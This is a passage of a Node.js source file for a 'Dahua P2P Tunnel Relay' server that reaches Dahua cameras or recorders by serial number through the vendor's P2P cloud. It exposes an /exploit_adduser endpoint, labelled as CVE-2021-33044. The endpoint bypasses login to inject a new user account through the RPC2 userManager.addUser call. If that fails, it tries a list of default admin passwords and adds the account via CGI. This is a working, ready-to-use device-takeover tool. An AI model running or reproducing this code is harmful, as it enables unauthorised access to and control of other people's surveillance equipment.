      var rpcPayload = JSON.stringify({ method: 'userManager.addUser', params: { Name: newUser, Password: newPass, Group: 'user', Sharable: true, Reserved: false }, id: 3, session: loginResult.session });
      var rpcRes = await sendHTTPThroughTunnel(tunnel.deviceSock, realmId, '/RPC2', 'POST', {'Content-Type':'application/json'}, rpcPayload);
      if (rpcRes.status === 200) { try { var rpcData = JSON.parse(rpcRes.body); if (rpcData.result === true) { allSteps.push({ step: 'adduser', status: 'done', message: 'Usuario "' + newUser + '" agregado via RPC!' }); return { success: true, steps: allSteps }; } } catch(e) {} }
      allSteps.push({ step: 'adduser', status: 'failed', message: 'Fallo: HTTP ' + addRes.status + ' / ' + (addRes.body || '').substring(0, 100) });
      return { success: false, steps: allSteps };
    } else {
      allSteps.push({ step: 'exploit', status: 'failed', message: loginResult.error });
      allSteps.push({ step: 'fallback', status: 'running', message: 'Intentando credenciales por defecto...' });
      try { tunnel.deviceSock.close(); tunnel.mainSock.close(); } catch(e) {}
      var defaultCreds = [{ user: 'admin', pass: 'admin' }, { user: 'admin', pass: '12345' }, { user: 'admin', pass: '888888' }, { user: 'admin', pass: '' }, { user: 'admin', pass: 'password' }];
      for (var ci = 0; ci < defaultCreds.length; ci++) {
        var cred = defaultCreds[ci];
        try {
          var ftunnel = await establishTunnel(serial, cred.user, cred.pass, targetPort);
          var frealmId = await bindTunnelPort(ftunnel.deviceSock, targetPort);
          var fcgiPath = '/cgi-bin/userManager.cgi?action=addUser&user.Name=' + encodeURIComponent(newUser) + '&user.Password=' + encodeURIComponent(newPass) + '&user.Group=user&user.Sharable=true&user.Reserved=false';
          var faddRes = await sendHTTPThroughTunnel(ftunnel.deviceSock, frealmId, fcgiPath, 'GET', {}, '');
          if (faddRes.status === 401) { var fwwwAuth = faddRes.headers['WWW-Authenticate'] || faddRes.headers['www-authenticate']; if (fwwwAuth) { var fdp = parseDigestAuth(fwwwAuth); var fauthHeader = buildDigestAuth('GET', fcgiPath, fdp, cred.user, cred.pass); frealmId = await bindTunnelPort(ftunnel.deviceSock, targetPort); faddRes = await sendHTTPThroughTunnel(ftunnel.deviceSock, frealmId, fcgiPath, 'GET', {Authorization: fauthHeader}, ''); } }
          try { ftunnel.deviceSock.close(); ftunnel.mainSock.close(); } catch(e) {}
          if (faddRes.status === 200 && faddRes.body.trim().toLowerCase() === 'ok') { allSteps.push({ step: 'fallback', status: 'done', message: 'Usuario agregado con creds: ' + cred.user + '/' + (cred.pass || '(empty)') }); return { success: true, steps: allSteps, credentials: cred }; }
          allSteps.push({ step: 'fallback_detail', message: 'Creds ' + cred.user + '/' + (cred.pass || '(empty)') + ' fallo (HTTP ' + faddRes.status + ')' });
        } catch(e) { allSteps.push({ step: 'fallback_detail', message: 'Creds ' + cred.user + '/' + (cred.pass || '(empty)') + ' fallo (' + e.message + ')' }); }
      }
      allSteps.push({ step: 'fallback', status: 'failed', message: 'Todas las credenciales fallaron' });
      return { success: false, steps: allSteps };
    }
  } finally { if (tunnel) { try { tunnel.deviceSock.close(); } catch(e) {} try { tunnel.mainSock.close(); } catch(e) {} } }
}

// ── HTTP Server ──
function readBody(req) {
  return new Promise(function(resolve) {
    var body = '';
    req.on('data', function(chunk) { body += chunk; });
    req.on('end', function() { resolve(body); });
  });
}

var server = http.createServer(async function(req, res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  if (req.method === 'OPTIONS') { res.writeHead(200); return res.end(); }

  if (req.url === '/health') {
    res.writeHead(200, { 'Content-Type': 'application/json' });
    return res.end(JSON.stringify({ status: 'ok', version: '3.1', features: ['status', 'tunnel', 'cgi', 'debug', 'exploit'] }));
  }

  // Debug endpoint - tests each step of tunnel establishment
  if (req.url.startsWith('/debug/') && req.method === 'GET') {
    var debugSerial = req.url.replace('/debug/', '').split('?')[0];
    if (!debugSerial || debugSerial.length < 10) {
      res.writeHead(400, { 'Content-Type': 'application/json' });
      return res.end(JSON.stringify({ error: 'Serial must be at least 10 characters' }));
    }
    var steps = [];
    try {
      steps.push('Starting debug for ' + debugSerial);
      var mainIp = await resolveHostname(MAIN_SERVER);
      steps.push('DNS resolved: ' + MAIN_SERVER + ' -> ' + mainIp);

      var mainSock = new P2PSocket();
      await mainSock.bind();
      mainSock.setRemote(mainIp, MAIN_PORT);
      steps.push('Socket bound on port ' + mainSock.lport);

      // Step 1: Probe
      try {
        var probeRes = await mainSock.request('/probe/p2psrv');
        steps.push('Step 1 probe: code=' + probeRes.code + ' status=' + probeRes.status);
      } catch (e) { steps.push('Step 1 probe FAILED: ' + e.message); }

      // Step 2: Get US server
      try {
        var onlineRes = await mainSock.request('/online/p2psrv/' + debugSerial);
        steps.push('Step 2 online: code=' + onlineRes.code + ' US=' + (onlineRes.xmlBody.US || 'none'));
        var usAddr = onlineRes.xmlBody.US;
        if (!usAddr) throw new Error('Device not registered');
        var usParts = usAddr.split(':');
        var usServer = usParts[0];
        var usPort = parseInt(usParts[1]);

        // Step 3: Probe device through US
        var usSock = new P2PSocket();
        await usSock.bind();
        usSock.setRemote(usServer, usPort);
        try {
          var devProbe = await usSock.request('/probe/device/' + debugSerial);
          steps.push('Step 3 probe device: code=' + devProbe.code);
        } catch (e) { steps.push('Step 3 probe device FAILED: ' + e.message); }
        try {
          var devInfo = await usSock.request('/info/device/' + debugSerial);
          steps.push('Step 3b info device: code=' + devInfo.code + ' keys=' + Object.keys(devInfo.xmlBody).join(','));
        } catch (e) { steps.push('Step 3b info FAILED: ' + e.message); }
        usSock.close();

        // Step 4: Get relay server
        try {
          var relayRes = await mainSock.request('/online/relay');
          steps.push('Step 4 relay: code=' + relayRes.code + ' Address=' + (relayRes.xmlBody.Address || 'none'));
          var relayAddr = relayRes.xmlBody.Address;
          if (!relayAddr) throw new Error('No relay server');
          var relayParts = relayAddr.split(':');
          var relayServer = relayParts[0];
          var relayPort = parseInt(relayParts[1]);

          // Step 5: Create P2P channel (no auth)
          var deviceSock = new P2PSocket();
          await deviceSock.bind();
          deviceSock.setRemote(mainIp, MAIN_PORT);
          var aid = crypto.randomBytes(8);
          var laddr = '127.0.0.1:' + deviceSock.lport;
          var ipaddr = 'true' + laddr;
          var aidHex = Array.from(aid).map(function(b) { return b.toString(16); }).join(' ');
          var channelBody = aidHex + ipaddr + '5.0.0';
          try {
            await deviceSock.request('/device/' + debugSerial + '/p2p-channel', channelBody, false);
            steps.push('Step 5 channel request sent (no read)');
          } catch (e) { steps.push('Step 5 channel FAILED: ' + e.message); }

          // Step 6: Get relay agent
          try {
            mainSock.setRemote(relayServer, relayPort);
            var agentRes = await mainSock.request('/relay/agent');
            steps.push('Step 6 agent: code=' + agentRes.code + ' Token=' + (agentRes.xmlBody.Token || 'none') + ' Agent=' + (agentRes.xmlBody.Agent || 'none'));
          } catch (e) { steps.push('Step 6 agent FAILED: ' + e.message); }

          // Step 7: Read device channel response
          try {
            var devRaw = await deviceSock.recv(5000);
            var devParsed = parseP2PResponse(devRaw);
            steps.push('Step 7 device response: code=' + devParsed.code + ' status=' + devParsed.status + ' keys=' + Object.keys(devParsed.xmlBody).join(','));
          } catch (e) { steps.push('Step 7 device response FAILED: ' + e.message); }

          deviceSock.close();
        } catch (e) { steps.push('Step 4 relay FAILED: ' + e.message); }
      } catch (e) { steps.push('Step 2 online FAILED: ' + e.message); }

      mainSock.close();
    } catch (e) { steps.push('FATAL: ' + e.message); }

    res.writeHead(200, { 'Content-Type': 'application/json' });
    return res.end(JSON.stringify({ serial: debugSerial, steps: steps }));
  }

  if (req.url === '/tunnel' && req.method === 'POST') {
    var body = await readBody(req);
    try {
      var params = JSON.parse(body);
      if (!params.serial || params.serial.length < 10) {
        res.writeHead(400, { 'Content-Type': 'application/json' });
        return res.end(JSON.stringify({ error: 'Serial must be at least 10 characters' }));
      }
      if (!params.cgi_path) {
        res.writeHead(400, { 'Content-Type': 'application/json' });
        return res.end(JSON.stringify({ error: 'cgi_path is required' }));
      }
      var result = await cgiThroughTunnel(params.serial, params.cgi_path, {
        username: params.username, password: params.password,
        http_user: params.http_user, http_pass: params.http_pass,
        target_port: params.target_port || 80,
        auto_auth: params.auto_auth || false
      });
      res.writeHead(200, { 'Content-Type': 'application/json' });
      return res.end(JSON.stringify(result));
    } catch (err) {
      res.writeHead(500, { 'Content-Type': 'application/json' });
      return res.end(JSON.stringify({ error: err.message }));
    }
  }

  // Exploit endpoint - CVE-2021-33044 user injection
  if (req.url === '/exploit_adduser' && req.method === 'POST') {
    var exploitBody = await readBody(req);
    try {
      var exploitParams = JSON.parse(exploitBody);
      if (!exploitParams.serial || exploitParams.serial.length < 10) { res.writeHead(400, {'Content-Type':'application/json'}); return res.end(JSON.stringify({error:'Serial must be at least 10 characters'})); }
      if (!exploitParams.new_user || !exploitParams.new_pass) { res.writeHead(400, {'Content-Type':'application/json'}); return res.end(JSON.stringify({error:'new_user and new_pass are required'})); }
      var exploitResult = await exploitAddUser(exploitParams.serial, exploitParams.new_user, exploitParams.new_pass, exploitParams.target_port || 80);
      res.writeHead(200, {'Content-Type':'application/json'});
      return res.end(JSON.stringify(exploitResult));
    } catch (exploitErr) {
      res.writeHead(500, {'Content-Type':'application/json'});
      return res.end(JSON.stringify({error: exploitErr.message}));
    }
  }

  var serial = req.url.replace(/^\//, '').split('?')[0];
  if (serial && serial.length >= 10) {
    try {
      var result = await checkP2P(serial);
      res.writeHead(200, { 'Content-Type': 'application/json' });
      return res.end(JSON.stringify(result));
    } catch (err) {
      res.writeHead(500, { 'Content-Type': 'application/json' });
      return res.end(JSON.stringify({ error: err.message }));
    }
  }

  res.writeHead(404, { 'Content-Type': 'application/json' });
  res.end(JSON.stringify({ error: 'Not found. Use GET /:serial or POST /tunnel' }));
});

process.on('uncaughtException', function(err) {
  console.error('[FATAL] Uncaught exception:', err.message);
  console.error(err.stack);
});

process.on('unhandledRejection', function(err) {
  console.error('[FATAL] Unhandled rejection:', err);
});

server.on('error', function(err) {
  console.error('[SERVER ERROR]', err.message);
  if (err.code === 'EADDRINUSE') {
    console.error('Port ' + PORT + ' is already in use');
  }
});

server.listen(PORT, function() {
  console.log('Dahua P2P Tunnel Relay v3.0 running on port ' + PORT);
  console.log('Endpoints:');
  console.log('  GET  /health      - Health check');
  console.log('  GET  /debug/:sn   - Debug tunnel steps');
  console.log('  GET  /:serial     - P2P status check');
  console.log('  POST /tunnel      - CGI through P2P tunnel');
});
